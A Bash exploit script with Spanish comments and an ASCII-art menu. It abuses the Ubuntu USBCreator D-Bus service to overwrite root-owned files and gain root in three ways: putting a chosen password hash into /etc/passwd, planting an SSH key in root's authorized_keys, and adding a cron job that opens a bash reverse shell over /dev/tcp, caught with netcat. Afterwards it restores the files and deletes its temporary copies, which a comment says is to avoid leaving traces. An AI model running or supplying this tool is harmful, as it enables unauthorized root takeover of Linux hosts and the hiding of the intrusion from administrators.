#!/bin/bash

greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function menu(){
clear
echo -e ${greenColour}" ██╗███╗   ███╗██████╗ ███████╗██████╗ ███████╗ ██████╗ ███╗   ██╗ █████╗ ████████╗ ██████╗ ██████╗"
sleep 0.05
echo -e " ██║████╗ ████║██╔══██╗██╔════╝██╔══██╗██╔════╝██╔═══██╗████╗  ██║██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗"
sleep 0.05
echo -e " ██║██╔████╔██║██████╔╝█████╗  ██████╔╝███████╗██║   ██║██╔██╗ ██║███████║   ██║   ██║   ██║██████╔╝"
sleep 0.05
echo -e " ██║██║╚██╔╝██║██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║   ██║██║╚██╗██║██╔══██║   ██║   ██║   ██║██╔══██╗"
sleep 0.05
echo -e " ██║██║ ╚═╝ ██║██║     ███████╗██║  ██║███████║╚██████╔╝██║ ╚████║██║  ██║   ██║   ╚██████╔╝██║  ██║"
sleep 0.05
echo -e " ╚═╝╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝"${endColour}

echo -e ${redColour}"										   ___         __   ___  __ __"
echo -e "										  / _ )__ __  / /  / _ \/ // /"
echo -e "										 / _  / // / / /__/ // / _  / "
echo -e "										/____/\_, / /____/\___/_//_/  "
echo -e "										     /___/                    "${endColour}



echo -e ${turquoiseColour}"Choose an option: "
echo -e ${yellowColour}"1- Privilege escalation by modifying /etc/passwd file"
echo -e "2- Privilege escalation by introducing our SSH Public Key on the authorized keys folder"
echo -e "3- Privilege escalation by modifying /etc/sudoers file"
echo -e "0- Exit\n" 
echo -n -e ${turquoiseColour}"Your choose: "${endColour}
read input
case "$input" in 
	1)

		echo -n -e ${yellowColour}"Introduce password para el usuario root: "${endColour}
		read newpass
		pass=$(openssl passwd $newpass)  # Generamos un hash openssl
		echo -e ${greenColour}"[*] Generando hash de Contrasena: $pass"${endColour}
		cp /etc/passwd .fake.txt
		cp /etc/passwd .original.txt # Creamos dos copias del archivo /etc/passwd
		rootline_original=$(cat .fake.txt | grep root | cut -d '/' -f1) #Obtenemos la linea del usuario root a editar
		rootline_edited=$(echo $rootline_original | sed "s/x/$pass/") #Modificamos la X por  el hash creado anteriorrmente
		echo -e ${greenColour}"[*] Cambiando X del root de la copia de /etc/password por el hash de Contrasena"${endColour}
		sed -i "s/$rootline_original/$rootline_edited/" .fake.txt  #Remplazamos la linea con el hash por  la linea original del archivo fake.txt
		echo -e ${greenColour}"[*] Modificando el /etc/passwd por nuestra copia con GDBus."${endColour}
		gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image $(pwd)/.fake.txt /etc/passwd true >/dev/null # Escrbrimos  este archivo con el GDBUS en el archivo original
		echo -e ${greenColour}"[*] Cambiando al usuario ROOT (Password: $newpass)"${endColour}
		su root
		gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image $(pwd)/.original.txt /etc/passwd true >/dev/null
		rm .fake.txt
		rm .original.txt # Borramos todas las modificaciones para evitar dejar rastros
		menu  # Llamamos de nuevo a la funcion menu
	;;
	2)
		echo -e ${greenColour}"[*] Generando Key SSH"${endColour}
		ssh-keygen -N '' -f .ssh_example   # Generamos una key ssh, con un passphrase  vacio.
		echo -e ${greenColour}"[*] Obteniendo Key SHH y guardando en fake_authorized_keys"${endColour}
		rev .ssh_example.pub | cut -d ' ' -f1 --complement | rev > .fake_authorized_keys  #Obtenemos solo la parte que nos interesa y lo guardamos en el archivo fake_authorized_keys
		echo -e ${greenColour}"[*] Modificando el authorized_keys de root con GDBus."${endColour}
		gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image $(pwd)/.fake_authorized_keys /root/.ssh/authorized_keys true > /dev/null #Escribimos dentro del directorio root las claves SSH las cuales son autorizadas por el usuario root y no pide contraseña para acceder .
		echo -e ${greenColour}"[*] Estableciendo conexion con root mediante SSH"${endColour}
		ssh -i .ssh_example root@localhost  # Ensamblamos conexion con el usuario root, pasandole la clave por parametro -i
		menu
	;;
	3)
		echo -e ${greenColour}"[*] Obteniendo copia del archivo /etc/crontab"${endColour}
		gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /etc/crontab $(pwd)/.fake_crontab.txt true > /dev/null # Obtenemos 1 copia del archivo sudoers
		cp .fake_crontab.txt .fake_crontab_editable.txt # Creamos una copia de la copia para poder editarlo
		echo -e ${greenColour}"[*] Agregando REVERSE SHELL al CRON De ROOT -- $current_user ALL=(ALL) ALL"${endColour}
		echo "*/1 * * * * root /bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'" >> .fake_crontab_editable.txt # Agregamos la reverse shell al cron de root
		echo -e ${greenColour}"[*] Sobreescribiriendo nuestra copia en /etc/crontab con GDBus."${endColour}
		gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image $(pwd)/.fake_crontab_editable.txt /etc/crontab true > /dev/null # Guardamos nuestro sudoers  editado al original
		echo -e ${greenColour}"[*] Esperando al Cron Maximo 1 min."${endColour}
		nc -nvlp 4444
		gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image $(pwd)/.fake_crontab.txt /etc/crontab true > /dev/null
		rm -f .fake_crontab.txt
		rm -f fake_crontab_editable.txt
		menu
	;;
	0)
		exit
	;;
esac

}
menu
